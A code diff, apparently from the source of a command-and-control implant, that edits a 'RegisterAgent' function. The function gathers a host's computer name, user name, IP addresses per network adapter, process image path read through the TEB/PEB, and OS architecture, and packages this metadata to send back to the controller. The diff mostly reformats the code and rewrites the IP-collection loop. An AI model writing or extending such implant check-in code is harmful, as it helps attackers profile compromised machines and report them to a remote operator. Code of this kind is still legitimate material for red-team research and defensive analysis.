@@ -69,11 +69,11 @@ INT RegisterAgent(pAgent agent) {
         return -1;
     }
 
-    if(!Enumerate(agent)) {
-		printf("[error] attempting to enumerate\n");
-		return -1;
-	}
-    if((err = AddInt32ToPackage(agent->packages, AGENT_MAGIC_VALUE)) != PACKAGE_SUCCESS) {
+    if (!Enumerate(agent)) {
+        printf("[error] attempting to enumerate\n");
+        return -1;
+    }
+    if ((err = AddInt32ToPackage(agent->packages, AGENT_MAGIC_VALUE)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add magic value to package\n");
         return -1;
     }
@@ -81,21 +81,38 @@ INT RegisterAgent(pAgent agent) {
         printf("[error] attempting to add agent id to package\n");
         return -1;
     }
-    if((err = AddStringToPackage(agent->packages, agent->Context->ComputerName)) != PACKAGE_SUCCESS) {
-		printf("[error] attempting to add computer name to package\n");
-		return -1;
-	}
-    if((err = AddStringToPackage(agent->packages, agent->Context->UserName)) != PACKAGE_SUCCESS) {
+    if ((err = AddStringToPackage(agent->packages, agent->Context->ComputerName)) != PACKAGE_SUCCESS) {
+        printf("[error] attempting to add computer name to package\n");
+        return -1;
+    }
+    if ((err = AddStringToPackage(agent->packages, agent->Context->UserName)) != PACKAGE_SUCCESS) {
         printf("[error] attempting to add user name to package\n");
         return -1;
     }
 
-    for(int i = 0; i < GetLPSTRArraySize(agent->Context->IPAddress); i++) {
-		if((err = AddStringToPackage(agent->packages, agent->Context->IPAddress[i])) != PACKAGE_SUCCESS) {
-			printf("[error] attempting to add ip address to package\n");
-			return -1;
+    INT Adapters = 0;
+    INT IPS = 0;
+    while (Adapters < 10) {
+        IPS = 0;
+        if (agent->Context->IPAddress[Adapters][IPS] == NULL) {
+            Adapters++;
+            continue;
+        }
+        if ((err = AddStringToPackage(agent->packages, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
+            printf("[error] attempting to add adapters to package\n");
+            return -1;
+        }
+        IPS++;
+        while(agent->Context->IPAddress[Adapters][IPS] != NULL && IPS < 5) {
+			if ((err = AddStringToPackage(agent->packages, agent->Context->IPAddress[Adapters][IPS])) != PACKAGE_SUCCESS) {
+				printf("[error] attempting to add ip address to package\n");
+				return -1;
+			}
+			IPS++;
 		}
-	}
+        Adapters++;
+    }
+
     if((err = AddStringToPackage(agent->packages, (  (PRTL_USER_PROCESS_PARAMETERS ) agent->pTeb->ProcessEnvironmentBlock->ProcessParameters)->ImagePathName.Buffer ) ) != PACKAGE_SUCCESS) {
 		printf("[error] attempting to add computer name to package\n");
 		return -1;
@@ -140,6 +157,7 @@ INT RegisterAgent(pAgent agent) {
         printf("[error] attempting to add os arch to package\n");
         return -1;
     }
+    //add IP address data to package.
 
     PackageSendMetaDataPackage(agent->packages, NULL, NULL, agent);
 
